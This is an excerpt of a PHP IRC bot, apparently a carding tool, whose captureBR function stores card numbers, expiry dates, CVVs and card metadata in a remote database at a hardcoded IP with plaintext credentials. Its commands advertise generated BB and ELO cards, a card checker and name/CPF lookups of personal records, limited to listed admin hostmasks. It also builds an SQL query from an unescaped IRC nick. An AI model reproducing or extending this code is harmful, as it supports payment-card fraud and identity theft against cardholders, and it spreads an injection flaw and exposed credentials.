...
function captureBR($ccnr,$ccmes,$ccano,$cccvv,$ccbanco,$ccnivel,$cctipo,$ccbandeira,$ccnick){
    $DBHOSTNAME     =	"191.235.81.135";
    $DBUSERNAME     =	"norah";
    $DBPASSWORD     =	"norah235144";
    $DBCAPTURE      =	"infocc";
...
function VerificaCliente($nickirc, $identd, $hostirc){
	...
	$DBUSERNAME     =	"norah";
	$DBPASSWORD     =	"norah235144";
	$DBPERMITIDOS   =	"registrados";

	$mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBPERMITIDOS);

	// VERIFICA NO DB
	$result = $mysqli->query("SELECT * FROM `usuarios` WHERE `user_nick` = '".$nickirc."'");
...
function EfetuaLogin($login, $password, $identd, $hostirc, $nickirc){
	...
	// SE TIVER O USUARIO
		...
		fputs($GLOBALS['socket'], "MODE #BRONX +v ".$nickirc."\n");
	} else {
...
// Send auth info
	fputs($socket,"USER ".$nickname." 0 * : [".$NAMESERVER."] Source By Norah_C_IV\n");
...
while(1) {
	...
	while($data = fgets($socket, 512)) {
		...
		if($ex[1] == "PRIVMSG" && $ex[2] == $nickname){
			...
			switch ($comando) {
				...
				fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] GERADAS BB [$statusGGBB] GERADAS ELO [$statusGGELO] CHECKER FULL [$statusFULL] CONSULTA NOME/CPF [$statusconsulta] \n");
			        break;
			    case version:
			        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → CheckNet PHP Bot [VERSÃO] $version (BETA) updated [$release]\n");
			        break;
			    case dados:
			...
			if ($ex[0] == ":JBiLTDA!t7DS@jbiltda.kiprest.com.br" || $ex[0] == ":GENEILTON01!~GENEILTON@FR13ND.COM" || $ex[0] == ":Norah_C_IV!~Norah_C_I@TH3R1V3R.COM") {
			    switch ($comando) {
			    case comandos:
		...
		// COMANDOS #BRONX
		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG #BRONX :!dados
		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#INFOCC"){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
